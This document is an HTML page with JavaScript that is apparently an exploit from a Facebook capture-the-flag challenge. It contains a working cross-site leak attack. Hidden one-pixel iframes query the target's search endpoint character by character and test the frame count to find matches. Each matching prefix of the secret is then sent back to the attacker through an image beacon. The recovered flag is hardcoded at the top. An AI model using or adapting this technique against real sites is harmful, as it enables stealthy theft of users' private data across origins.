
<body>
<style>
iframe { width: 1px; height: 1px; border: none; }
</style>
<link href=https://code.jquery.com/jquery-3.3.1.slim.min.js rel=prefetch>
<script>
var flag='fb{cr055_s173_l34|<5_4r4_c00ool!!}'
// flag = 'fb{'
var keys='abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+|<>{}_'
keys=[...keys].reverse().join()
function trial(q,x){
var url = 'http://challenges.fbctf.com:8082/search?query='+encodeURIComponent(q+'\\'+x)
var iframe=document.createElement('iframe')
iframe.src=url
//iframe.sandbox=''
iframe.onload=function(){
if(iframe.contentWindow.length) {
new Image().src='/?result='+q+x
flag=q+x
generate()
}
document.body.removeChild(iframe)
}
document.body.appendChild(iframe)
}

function generate() {
[...keys].forEach(x=>trial(flag,x))
}

onload=()=>{
generate()
}
</script>
</body>
